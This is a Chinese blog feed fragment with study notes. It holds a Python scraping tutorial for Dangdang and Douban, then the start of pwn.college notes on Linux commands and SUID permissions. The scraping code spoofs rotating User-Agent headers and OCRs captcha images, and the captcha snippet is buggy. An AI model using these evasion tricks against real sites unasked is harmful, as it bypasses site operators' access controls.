ua.edge&#125;</span><br><span class="line"><span class="comment"># 2. 创建请求对应</span></span><br><span class="line">req = request.Request(url=url, headers = headers)</span><br><span class="line"><span class="comment"># 3. 获取响应对象</span></span><br><span class="line">res = request.urlopen(req)</span><br><span class="line"><span class="comment"># 4. 获取响应内容</span></span><br><span class="line">html = res.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="保存为本地文件"><a href="#保存为本地文件" class="headerlink" title="保存为本地文件"></a>保存为本地文件</h3><p>把爬取的照片保存至本地，此处需要使用 Python 编程的文件 IO 操作，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 三、保存文件至当前目录</span><br><span class="line">filename =  &#x27;杀戮天使.html&#x27;</span><br><span class="line">with open(filename,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">    f.write(html)</span><br></pre></td></tr></table></figure><h3 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from urllib import parse</span><br><span class="line">from urllib import request</span><br><span class="line">from fake_useragent import UserAgent</span><br><span class="line"></span><br><span class="line"># 一、 拼接 URL 地址</span><br><span class="line">query_string = &#123;</span><br><span class="line">    &#x27;wd&#x27; : &#x27;杀戮天使&#x27;</span><br><span class="line">&#125;</span><br><span class="line"># 编码</span><br><span class="line">result = parse.urlencode(query_string)</span><br><span class="line"># 使用format函数拼接url地址</span><br><span class="line">url = &#x27;https://www.baidu.com/s?&#123;&#125;&#x27;.format(result)</span><br><span class="line"></span><br><span class="line"># 二、 向 URL 发送请求</span><br><span class="line"># 1. 重构请求头</span><br><span class="line">ua = UserAgent()</span><br><span class="line">headers = &#123;&#x27;User-Agent&#x27; : ua.edge&#125;</span><br><span class="line"># 2. 创建请求对应</span><br><span class="line">req = request.Request(url=url, headers = headers)</span><br><span class="line"># 3. 获取响应对象</span><br><span class="line">res = request.urlopen(req)</span><br><span class="line"># 4. 获取响应内容</span><br><span class="line">html = res.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line"># 三、保存文件至当前目录</span><br><span class="line">filename =  &#x27;杀戮天使.html&#x27;</span><br><span class="line">with open(filename,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">    f.write(html)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="实战（当当网）"><a href="#实战（当当网）" class="headerlink" title="实战（当当网）"></a>实战（当当网）</h2><p><a href="http://bang.dangdang.com/books/fivestars/01.00.00.00.00.00-recent30-0-0-1-1">http://bang.dangdang.com/books/fivestars/01.00.00.00.00.00-recent30-0-0-1-1</a></p><p>从1到25页的图书名称</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过页面url信息可以发现url组成</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_url</span>(<span class="params">page</span>):</span><br><span class="line">    url = <span class="string">&quot;http://bang.dangdang.com/books/fivestars/01.00.00.00.00.00-recent30-0-0-1-&quot;</span> + <span class="built_in">str</span>(page)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对当当网的请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_dangdang</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># 重构请求头</span></span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span> : ua.random&#125;</span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="comment"># 如果状态码为200，请求成功</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="comment"># 返回网页源代码</span></span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将信息写入文件中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_write</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./book.txt&quot;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析获取到的源码信息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info_parse</span>(<span class="params">html</span>):</span><br><span class="line">    <span class="comment"># 可以上网查询一下使用方法</span></span><br><span class="line">    <span class="comment"># 使用BeautifulSoup库， html 代表需要解析的源代码， &#x27;html.parser&#x27;是解析器</span></span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    <span class="comment"># 找到所有的class == name的div标签，存入list</span></span><br><span class="line">    div_name = soup.find_all(class_= <span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="comment"># 对list中的每一个div标签, 提取其中的a标签的内容</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> div_name:</span><br><span class="line">        <span class="comment"># 提取出名字</span></span><br><span class="line">        a_content = item.a.text</span><br><span class="line">        <span class="comment"># 加上换行符写入文件中去</span></span><br><span class="line">        a_content += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">        file_write(a_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">        url = get_url(page)</span><br><span class="line">        <span class="comment"># 提取网页源码</span></span><br><span class="line">        html = request_dangdang(url)</span><br><span class="line">        <span class="comment"># 提取需要的信息</span></span><br><span class="line">        info_parse(html)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="实战（豆瓣）"><a href="#实战（豆瓣）" class="headerlink" title="实战（豆瓣）"></a>实战（豆瓣）</h2><p><a href="https://movie.douban.com/top250?start=100&filter=">https://movie.douban.com/top250?start=100&amp;filter=</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_url</span>(<span class="params">page</span>):</span><br><span class="line">    url = <span class="string">&quot;https://movie.douban.com/top250?start=&quot;</span> + <span class="built_in">str</span>(page)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_src_code</span>(<span class="params">url</span>):</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span> : ua.random&#125;</span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info_parse</span>(<span class="params">html</span>):</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = soup.find(class_=<span class="string">&#x27;grid_view&#x27;</span>).find_all(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        item_name = item.find(class_=<span class="string">&#x27;title&#x27;</span>).string</span><br><span class="line">        item_img = item.find(<span class="string">&#x27;a&#x27;</span>).find(<span class="string">&#x27;img&#x27;</span>).get(<span class="string">&quot;src&quot;</span>)</span><br><span class="line">        item_index = item.find(class_=<span class="string">&quot;&quot;</span>).string</span><br><span class="line">        item_score = item.find(class_=<span class="string">&quot;rating_num&quot;</span>).string</span><br><span class="line">        <span class="keyword">if</span> item.find(class_=<span class="string">&#x27;inq&#x27;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            item_inq = item.find(class_=<span class="string">&#x27;inq&#x27;</span>).string</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            item_inq = <span class="string">&quot;NOT AVAILABLE&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(item_index + <span class="string">&quot;|&quot;</span> + item_name + <span class="string">&quot;|&quot;</span> + item_score + <span class="string">&quot;|&quot;</span> + item_inq)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    page = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">250</span>, <span class="number">25</span>):</span><br><span class="line">        url = get_url(page)</span><br><span class="line">        html = get_src_code(url)</span><br><span class="line">        info_parse(html)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><p><a href="https://zhuanlan.zhihu.com/p/64702600">一篇文章搞定Python多进程(全) - 知乎 (zhihu.com)</a></p><p>我们通过多开进程处理同一个程序使得运行时间缩短，在上面的代码中，我们将<code>get_src_code(url)</code>和<code>info_parse(html)</code>封装为<code>handle(url)</code>，这样我们就可以开多个进程，每个进程都执行handle函数，把所有的url分配给这5个进程，这5个进程同时执行，就缩短了执行时间。单进程（约4秒）–&gt; 多进程（约1秒）</p><p>下面是修改后的豆瓣代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_url</span>(<span class="params">page</span>):</span><br><span class="line">    url = <span class="string">&quot;https://movie.douban.com/top250?start=&quot;</span> + <span class="built_in">str</span>(page)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_src_code</span>(<span class="params">url</span>):</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span> : ua.random&#125;</span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info_parse</span>(<span class="params">html</span>):</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = soup.find(class_=<span class="string">&#x27;grid_view&#x27;</span>).find_all(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        item_name = item.find(class_=<span class="string">&#x27;title&#x27;</span>).string</span><br><span class="line">        item_img = item.find(<span class="string">&#x27;a&#x27;</span>).find(<span class="string">&#x27;img&#x27;</span>).get(<span class="string">&quot;src&quot;</span>)</span><br><span class="line">        item_index = item.find(class_=<span class="string">&quot;&quot;</span>).string</span><br><span class="line">        item_score = item.find(class_=<span class="string">&quot;rating_num&quot;</span>).string</span><br><span class="line">        <span class="keyword">if</span> item.find(class_=<span class="string">&#x27;inq&#x27;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            item_inq = item.find(class_=<span class="string">&#x27;inq&#x27;</span>).string</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            item_inq = <span class="string">&quot;NOT AVAILABLE&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(item_index + <span class="string">&quot;|&quot;</span> + item_name + <span class="string">&quot;|&quot;</span> + item_score + <span class="string">&quot;|&quot;</span> + item_inq)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">url</span>):</span><br><span class="line">    html = get_src_code(url)</span><br><span class="line">    info_parse(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    startTime = time.time()</span><br><span class="line"></span><br><span class="line">    urls = []</span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">250</span>, <span class="number">25</span>):</span><br><span class="line">        url = get_url(page)</span><br><span class="line">        urls.append(url)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 多进程爬取</span></span><br><span class="line">    pool = Pool(<span class="number">5</span>)</span><br><span class="line">    pool.<span class="built_in">map</span>(handle, urls)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    <span class="comment"># handle()</span></span><br><span class="line">    endTime = time.time()</span><br><span class="line">    dTime = endTime - startTime</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;运行时间： %s s&quot;</span> % dTime)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="图片验证码（pytesseract）"><a href="#图片验证码（pytesseract）" class="headerlink" title="图片验证码（pytesseract）"></a>图片验证码（pytesseract）</h2><p><a href="https://vip.fxxkpython.com/?p=4848">python爬虫20 | 小帅b教你如何识别图片验证码 – 通往Python高手之路 (fxxkpython.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入相关模块</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">captcha = Image.open(&quot;captcha1.png&quot;)</span><br><span class="line"># 图片识别为字符串</span><br><span class="line">result = pytesseract.image_to_string(captcha)</span><br><span class="line"># 图片进行灰度处理</span><br><span class="line">result = captcha.convert(&#x27;L&#x27;)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><h2 id="Scrapy框架的使用"><a href="#Scrapy框架的使用" class="headerlink" title="Scrapy框架的使用"></a>Scrapy框架的使用</h2><p><a href="https://www.bilibili.com/video/BV1ha4y1H7sx?p=60&vd_source=a87fbd3945da4b0dcfade345051aeae4">Day8 - 3.scrapy基本使用_哔哩哔哩_bilibili</a></p><ol><li><p><strong>创建一个工程</strong>: scrapy startproject xxxxx</p></li><li><p><strong>在spiders子目录中创建一个爬虫文件</strong></p><p>​scrapy genspider xxxx(name) <a href="http://www.xxx.com(url)/">www.xxx.com(url)</a></p></li><li><p><strong>执行工程</strong>: </p><p>​scrapy crawl xxxx(name)</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://c.biancheng.net/python_spider/useragent-pool.html&quot;&gt;构建User-Agnet代理池 (biancheng.net)&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;爬虫&quot;&gt;&lt;a href=&quot;#爬虫&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="https://1xueyu1.github.io/categories/python/"/>
    
    <category term="爬虫" scheme="https://1xueyu1.github.io/categories/python/%E7%88%AC%E8%99%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn_college</title>
    <link href="https://1xueyu1.github.io/2024/01/17/pwn-college/"/>
    <id>https://1xueyu1.github.io/2024/01/17/pwn-college/</id>
    <published>2024-01-17T14:22:05.000Z</published>
    <updated>2024-02-19T09:12:31.556Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server">https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server</a></p><h1 id="Program-Misuse"><a href="#Program-Misuse" class="headerlink" title="Program Misuse"></a>Program Misuse</h1><p><strong><a href="https://github.com/J-shiro/J-shiro.github.io/blob/master/content/post/english/pwn_college/module1/index.md">解答1</a><a href="https://tech.c01dkit.com/">解答2</a></strong></p><h2 id="Linux-Command"><a href="#Linux-Command" class="headerlink" title="Linux Command"></a>Linux Command</h2><p>① <strong>Learning the command line</strong></p><ol><li><p><a href="https://overthewire.org/wargames/bandit/">Bandit</a></p></li><li><p><code>cat</code>: 用于连接文件并打印到标准输出设备上。</p><ul><li><strong>-n 或 –number</strong>：由 1 开始对所有输出的行数编号。</li><li><strong>-b 或 –number-nonblank</strong>：和 -n 相似，只不过对于空白行不编号。</li></ul></li><li><p><code>more</code>: 以一页一页的形式显示</p></li><li><p><code>less</code>: 和 more 类似</p></li><li><p><code>head</code>: 命令可用于查看文件的开头部分的内容，有一个常用的参数 <strong>-n</strong> 用于显示行数，默认为 10，即显示 10 行的内容。</p></li><li><p><code>tail</code>: 与 head 相反</p></li><li><p><code>sort</code>: 用于将文本文件内容加以排序。</p><ul><li>-r : 反序</li></ul></li><li><p><code>rev</code>（reverse）用于将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，以此类推。</p></li><li><p><code>od</code>指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来。</p><ul><li><pre><code>-b:octal-x -h:hex-c:ASCII-d:Decimal(ten)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">10. **`hd`** : hexdump, mainly used to view the **hexadecimal encoding** of **Binary files**.</span><br><span class="line"></span><br><span class="line">11. `xxd`: Convert any file to **hexadecimal** or binary(-b) form</span><br><span class="line"></span><br><span class="line">12. `base32/base64` base32 [op] [file] 编码, -d 解码</span><br><span class="line"></span><br><span class="line">13. `split`该指令将大文件分割成较小的文件，在默认情况下将按照每1000行切割成一个小文件。</span><br><span class="line"></span><br><span class="line">    - ```</span><br><span class="line">      split [--help][--version][-&lt;行数&gt;][-b &lt;字节&gt;][-C &lt;字节&gt;][-l &lt;行数&gt;][要切割的文件][输出文件名]</span><br></pre></td></tr></table></figure></code></pre></li><li><p>-&lt;行数&gt; : 指定每多少行切成一个小文件</p></li><li><p>-b&lt;字节&gt; : 指定每多少字节切成一个小文件</p></li><li><p>[输出文件名] : 设置切割后文件的前置文件名， split会自动在前置文件名后再加上编号</p></li></ul></li><li><p><code>gzip</code>是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多出”.gz”的扩展名。</p><ul><li>-c或–stdout或–to-stdout 　把压缩后的文件输出到标准输出设备，不去更动原始文件。</li><li>-f或–force 　强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接。</li><li>-l或–list 　列出压缩文件的相关信息。</li><li>-t或–test 　测试压缩文件是否正确无误。</li><li>-d或–decompress或—-uncompress 　解开压缩文件。</li></ul></li><li><p><code>bzip2</code>采用新的压缩演算法, bbzip2压缩完文件后会产生.bz2的压缩文件，并删除原始的文件。</p><ul><li>-c或–stdout 　将压缩与解压缩的结果送到标准输出。</li><li>-d或–decompress 　执行解压缩。</li><li>-f或–force 　bzip2在压缩或解压缩时，若输出文件与现有文件同名，预设不会覆盖现有文件。若要覆盖，请使用此参数。</li><li>-t或–test 　测试.bz2压缩文件的完整性。</li></ul></li><li><p><code>zip</code> 是个使用广泛的压缩程序，压缩后的文件后缀名为 <strong>.zip</strong>。</p><ul><li>-q 不显示指令执行过程。</li><li>-r 递归处理，将指定目录下的所有文件和子目录一并处理。</li><li>-b&lt;工作目录&gt; 指定暂时存放文件的目录。</li><li>-d 从压缩文件内删除指定的文件。</li></ul></li><li><p><code>tar</code> 是用来建立，还原备份文件的工具程序，它可以加入，解开备份文件内的文件。</p><ul><li>-c或–create 建立新的备份文件。</li><li>-d或–diff或–compare 对比备份文件内和文件系统上的文件的差异。</li><li>-f&lt;备份文件&gt;或–file&#x3D;&lt;备份文件&gt; 指定备份文件。</li><li>-z或–gzip或–ungzip 通过gzip指令处理备份文件。</li><li>-v或–verbose 显示指令执行过程。</li></ul></li><li><p><code>ar</code>可让您集合许多文件，成为单一的备存文件。在备存文件中，所有成员文件皆保有原来的属性与权限。</p><ul><li><pre><code>-r:The file is inserted into the backup file-v:show the detail information-d 　删除备存文件中的成员文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">19. **`cpio`**: used to backup file</span><br><span class="line"></span><br><span class="line">    - -o或--create 　执行copy-out模式，建立备份档。</span><br><span class="line"></span><br><span class="line">20. `find`:find [路径] [匹配条件] [动作]</span><br><span class="line"></span><br><span class="line">    - `-name pattern`：按文件名查找，支持使用通配符 `*` 和 `?`。</span><br><span class="line">    - `-type type`：按文件类型查找，可以是 `f`（普通文件）、`d`（目录）、`l`（符号链接）等。</span><br><span class="line">    - `-size [+-]size[cwbkMG]`：按文件大小查找，支持使用 `+` 或 `-` 表示大于或小于指定大小，单位可以是 `c`（字节）、`w`（字数）、`b`（块数）、`k`（KB）、`M`（MB）或 `G`（GB）。</span><br><span class="line">    - `-user username`：按文件所有者查找。</span><br><span class="line">    - `-mtime days`：按修改时间查找，支持使用 `+` 或 `-` 表示在指定天数前或后，days 是一个整数表示天数。</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Privilege Escalation</span><br><span class="line"></span><br><span class="line">① **permission model**</span><br><span class="line"></span><br><span class="line">Permissions: **r: 4 w: 2 x: 1**</span><br><span class="line"></span><br><span class="line">File: </span><br><span class="line"></span><br><span class="line">- first `rwx`: **owner user** </span><br><span class="line">- second `rwx`: **owner group** </span><br><span class="line">- third `rwx`: **other groups**</span><br><span class="line"></span><br><span class="line">default **UID: 1000**, **UID 0** is the Linux administrator user root</span><br><span class="line"></span><br><span class="line">② **Privilege elevation**</span><br><span class="line"></span><br><span class="line">run an suid binary such as `sudo`, `su`, `newgrp`(SUID is a bit in the Linux permission model)</span><br><span class="line"></span><br><span class="line">**SUID**: execute with the `eUID` of the file owner rather than the parent process.</span><br><span class="line"></span><br><span class="line">**SGID**: execute with the `eGID` of the file owner rather than the parent process.</span><br><span class="line"></span><br><span class="line">**Sticky**: used for shared directories to limit file removal to file owners.</span><br><span class="line"></span><br><span class="line">three different type of user and group IDs</span><br><span class="line"></span><br><span class="line">- **Effective(eUID,eGID):** used for most access checks--&gt;root:0</span><br><span class="line">- **Real(UID,GID):** true identity of the process owner, used for signal checks</span><br><span class="line">- **Saved:** used for temporarily dropping privileges</span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ol><p>gcc -w:Does not generate any warning information.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>sudo chmod u+s xxx#SetUID bit, other users can have the file owner permissions<br>#user:rwx—&gt;rws<br>sudo chown root.root xxx #it will cancel the ‘s’ user:rws—&gt;rwx<br>sudo chmod g+s xxx #group:rwx—&gt;rws</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 